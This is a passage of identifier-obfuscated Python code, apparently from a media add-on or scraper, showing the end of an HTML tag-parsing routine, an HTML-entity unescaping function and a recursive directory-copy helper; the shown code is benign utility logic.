                    OOOO0O0OO0O0000O0 =OOO0O0O0OO000000O [O0000O000O0OO0OOO +len (O0O00O00O000O000O ):OO0OOOO0OOOOO0OO0 ]#line:3937
                elif OO0OOOO0OOOOO0OO0 >-1 :#line:3938
                    OOOO0O0OO0O0000O0 =OOO0O0O0OO000000O [:OO0OOOO0OOOOO0OO0 ]#line:3939
                elif O0000O000O0OO0OOO >-1 :#line:3940
                    OOOO0O0OO0O0000O0 =OOO0O0O0OO000000O [O0000O000O0OO0OOO +len (O0O00O00O000O000O ):]#line:3941
                if ret :#line:3943
                    O0OOO000O0OOOOOO0 =OOO0O0O0OO000000O [OO0OOOO0OOOOO0OO0 :OOO0O0O0OO000000O .find (">",OOO0O0O0OO000000O .find (O0OOO000O0OOOOOO0 ))+1 ]#line:3944
                    OOOO0O0OO0O0000O0 =O0O00O00O000O000O +OOOO0O0OO0O0000O0 +O0OOO000O0OOOOOO0 #line:3945
                OOO0O0O0OO000000O =OOO0O0O0OO000000O [OOO0O0O0OO000000O .find (OOOO0O0OO0O0000O0 ,OOO0O0O0OO000000O .find (O0O00O00O000O000O ))+len (OOOO0O0OO0O0000O0 ):]#line:3947
                O000O00O0O0O00000 .append (OOOO0O0OO0O0000O0 )#line:3948
            O00O0OO0OOOOOO00O =O000O00O0O0O00000 #line:3949
        O00000O00000000OO +=O00O0OO0OOOOOO00O #line:3950
    return O00000O00000000OO #line:3952
def replaceHTMLCodes (OO0OOO0OO0O00OO0O ):#line:3955
    OO0OOO0OO0O00OO0O =re .sub ("(&#[0-9]+)([^;^0-9]+)","\\1;\\2",OO0OOO0OO0O00OO0O )#line:3956
    OO0OOO0OO0O00OO0O =HTMLParser .HTMLParser ().unescape (OO0OOO0OO0O00OO0O )#line:3957
    OO0OOO0OO0O00OO0O =OO0OOO0OO0O00OO0O .replace ("&quot;","\"")#line:3958
    OO0OOO0OO0O00OO0O =OO0OOO0OO0O00OO0O .replace ("&amp;","&")#line:3959
    return OO0OOO0OO0O00OO0O #line:3960
import os #line:3962
from shutil import *#line:3963
def copytree (O00OO000OOOO000O0 ,OOO00OOOOO0OO0000 ,symlinks =False ,ignore =None ):#line:3964
    O00OOOO000O00O00O =os .listdir (O00OO000OOOO000O0 )#line:3965
    if ignore is not None :#line:3966
        OOOO0000O0O0OOO0O =ignore (O00OO000OOOO000O0 ,O00OOOO000O00O00O )#line:3967
    else :#line:3968
        OOOO0000O0O0OOO0O =set ()#line:3969
    if not os .path .isdir (OOO00OOOOO0OO0000 ):#line:3970
        os .makedirs (OOO00OOOOO0OO0000 )#line:3971
    O0OO000O00OOOOOOO =[]#line:3972
    for O0O000O00O000O000 in O00OOOO000O00O00O :#line:3973
        if O0O000O00O000O000 in OOOO0000O0O0OOO0O :#line:3974
            continue #line:3975
        OOOO0O000O00OO000 =os .path .join (O00OO000OOOO000O0 ,O0O000O00O000O000 )#line:3976
        OOOO0O000OOOO000O =os .path .join (OOO00OOOOO0OO0000 ,O0O000O00O000O000 )#line:3977
        try :#line:3978
            if symlinks and os .path .islink (OOOO0O000O00OO000 ):#line:3979
                O0OO000O00O00OOOO =os .readlink (OOOO0O000O00OO000 )#line:3980
                os .symlink (O0OO000O00O00OOOO ,OOOO0O000OOOO000O )#line:3981
            elif os .path .isdir (OOOO0O000O00OO000 ):#line:3982
                copytree (OOOO0O000O00OO000 ,OOOO0O000OOOO000O ,symlinks ,ignore )#line:3983
            else :#line:3984
                copy2 (OOOO0O000O00OO000 ,OOOO0O000OOOO000O )#line:3985
        except Error as OOOO0O0O0OO0000O0 :#line:3986
            O0OO000O00OOOOOOO .extend (OOOO0O0O0OO0000O0 .args [0 ])#line:3987
        except EnvironmentError as O0O0OO00O000OO0OO :#line:3988
            O0OO000O00OOOOOOO .append ((OOOO0O000O00OO000 ,OOOO0O000OOOO000O ,str (O0O0OO00O000OO0OO )))#line:3989
    try :#line:3990
        copystat (O00OO000OOOO000O0 ,OOO00OOOOO0OO0000 )#line:3991
    except OSError as O0O0OO00O000OO0OO :#line:3992
        O0OO000O00OOOOOOO .extend ((O00OO000OOOO000O0 ,OOO00OOOOO0OO0000 ,str (O0O0OO00O000OO0OO )))#line:3993
